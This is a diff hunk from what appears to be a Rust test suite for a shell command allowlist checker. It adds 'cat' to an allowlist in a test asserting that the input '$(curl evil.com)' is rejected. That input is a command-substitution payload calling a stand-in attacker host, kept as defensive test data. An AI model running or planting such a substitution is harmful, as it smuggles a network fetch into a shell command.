@@ -256,7 +256,7 @@ fn blocks_eval() {
 }
 #[test]
 fn blocks_command_substitution_at_command_pos() {
-    let list = allow(&["echo"]);
+    let list = allow(&["echo", "cat"]);
     assert!(check_all_segments("$(curl evil.com)", &list).is_err());
 }
 #[test]
